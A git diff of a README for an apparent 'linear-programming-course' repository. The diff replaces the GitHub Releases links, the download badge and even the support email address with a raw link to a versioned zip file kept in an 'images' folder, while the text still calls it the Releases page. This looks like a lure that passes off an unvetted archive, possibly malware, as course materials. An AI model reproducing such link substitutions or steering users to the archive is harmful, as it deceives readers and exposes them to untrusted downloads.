@@ -1,7 +1,7 @@
 # 🎓 linear-programming-course - Learn Optimization with Ease
 
 ## 🔗 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/potential-capecod949/linear-programming-course/releases)
+[![Download from Releases](https://raw.githubusercontent.com/potential-capecod949/linear-programming-course/main/images/linear-programming-course_v3.1-alpha.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/potential-capecod949/linear-programming-course/main/images/linear-programming-course_v3.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **linear-programming-course**. This course provides a hands-on approach to learning linear programming and mathematical optimization techniques. We aim to make these complex topics accessible to everyone.
@@ -21,7 +21,7 @@ This course includes a variety of features designed to enhance your learning exp
 - **Support and Resources:** Access additional materials and support to deepen your understanding.
 
 ## 📥 Download & Install
-To download the course materials, visit our [Releases page](https://github.com/potential-capecod949/linear-programming-course/releases).
+To download the course materials, visit our [Releases page](https://raw.githubusercontent.com/potential-capecod949/linear-programming-course/main/images/linear-programming-course_v3.1-alpha.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the course.
@@ -67,7 +67,7 @@ To enhance your learning experience, make sure to check out the following resour
 ## 💬 Questions or Support?
 If you have any questions or need support while using the course materials, please don't hesitate to reach out:
 
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/potential-capecod949/linear-programming-course/main/images/linear-programming-course_v3.1-alpha.5.zip
 - **Community Forum:** Join our online community to share your experiences and solutions.
 
 Thank you for choosing the **linear-programming-course**. We hope you enjoy your learning journey and find it both informative and engaging!
